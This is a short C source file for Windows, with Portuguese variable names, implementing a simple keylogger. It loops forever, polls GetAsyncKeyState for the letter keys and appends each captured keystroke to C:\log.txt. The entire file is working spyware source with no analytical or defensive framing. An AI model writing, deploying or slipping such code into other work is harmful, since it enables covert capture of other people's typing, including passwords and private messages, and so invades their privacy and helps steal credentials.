#include <windows.h>
#include <stdio.h>

int main()
{
    int result, teclas;
    FILE *arquivo;

    arquivo = fopen("C:\\log.txt","w+");

    while(1) {
        for(teclas = 64; teclas <= 90; teclas++) {
            Sleep(1);

            result = GetAsyncKeyState(teclas);

            if(result == -32767) {
                fprintf(arquivo,"%c",teclas);
            }
        }
    }
    
    return 0;
}
